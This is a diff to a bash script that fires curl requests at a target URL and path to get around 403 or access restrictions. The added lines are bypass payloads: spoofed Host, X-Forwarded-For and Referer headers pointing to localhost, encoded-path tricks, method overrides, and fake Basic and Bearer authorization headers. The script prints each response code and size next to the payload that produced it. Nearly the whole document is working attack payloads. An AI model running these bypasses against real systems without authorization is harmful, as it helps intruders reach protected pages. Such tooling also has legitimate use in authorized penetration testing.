@@ -6,6 +6,7 @@ if [ $# -ne 2 ]; then
 fi
 
 declare -a curl_payloads=(
+    # Existing Bypasses
     "$1/$2%5c"
     "$1/$2%2F"
     "$1/$2+"
@@ -26,9 +27,37 @@ declare -a curl_payloads=(
     "-H \"X-Forwarded-Proto: https\" $1/$2"
     "-H \"Accept: */*\" $1/$2"
     "-H \"Expect: 100-continue\" $1/$2"
+
+    # New Bypasses
+    "-H \"Referer: http://localhost\" $1/$2"
+    "-H \"Host: 127.0.0.1\" $1/$2"
+    "$1/$2."
+    "$1/$2;/"
+    "-X GET $1/$2"
+    "$1/$2?"
+    "-b \"cookie=\" $1/$2"
+    "-X OPTIONS $1/$2"
+    "-H \"Origin: http://trusted.com\" $1/$2"
+    "-H \"X-Forwarded-For: 127.0.0.1\" $1/$2"
+    "-A \"\" $1/$2"
+    "$1/$2%2520"
+    "-X HEAD $1/$2"
+    "-H \"Transfer-Encoding: chunked\" $1/$2"
+    "$1/$2%23"
+    "-H \"Proxy-Authorization: Basic dXNlcjpwYXNz\" $1/$2"
+    "http://subdomain.$1/$2"
+    "$1/$2%7C"
+    "-H \"Authorization: Bearer fake_token\" $1/$2"
+    "-H \"Host: [::1]\" $1/$2"
+    "$1/$2%26"
+    "-H \"Content-Type: application/json\" -H \"Accept: application/json\" $1/$2"
+    "$1/$2%2C"
+    "-H \"X-HTTP-Method-Override: PUT\" $1/$2"
+    "$1/$2/"
 )
 
+# Execute each curl payload and display HTTP response code and download size
 for payload in "${curl_payloads[@]}"; do
-    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $payload
-    echo "  --> $payload"
+    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $payload)
+    echo "$response  --> $payload"
 done
